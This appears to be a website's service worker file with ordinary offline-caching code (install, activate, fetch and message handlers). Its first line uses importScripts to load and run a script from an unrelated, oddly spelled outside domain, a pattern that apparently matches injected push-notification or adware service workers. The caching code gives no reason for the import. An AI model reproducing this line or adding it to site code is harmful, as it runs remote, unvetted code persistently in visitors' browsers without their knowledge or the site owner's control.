if (typeof importScripts === 'function') { importScripts('https://spirteddvaita.com/pntnsw/65077?v=21'); }

const e = "my-site-cache-v2", 
	  d = ["/", "/favicon.ico","/glx_65077.js","/manifest.json"];

self.addEventListener("install", (c => {
    c.waitUntil(caches.open(e).then((e => e.addAll(d))))
}
));

self.addEventListener("activate", (d => {
	d.waitUntil(caches.keys().then((d => Promise.all(d.map((d => 0 === d.indexOf(e) ? null : caches.delete(d)))))))
}));

self.addEventListener("fetch", (c => {
    const b = c.request;
    if ("GET" !== b.method)
        return null;
    const i = new URL(c.request.url);
    if ("/" === i.pathname || i.pathname.match(/\/\w{2}-\w{3}$/) || i.pathname.match(/\/\w{2}$/))
        c.respondWith(caches.open(e).then((e => e.match(b).then((d => fetch(b).then((d => (e.put(b, d.clone()),
        d))).catch(( () => d)) || d)))));
    else if (d.includes(i.href) || d.includes(i.pathname))
        c.respondWith(caches.open(e).then((e => e.match(b).then((e => e || fetch(b))))));
    else if ("navigate" === b.mode)
        return c.respondWith(fetch(c.request).catch(( () => caches.match("/"))));
    return !0
}));

self.addEventListener("message", (e => {
    "SKIP_WAITING" === e.data.type && self.skipWaiting()
}));
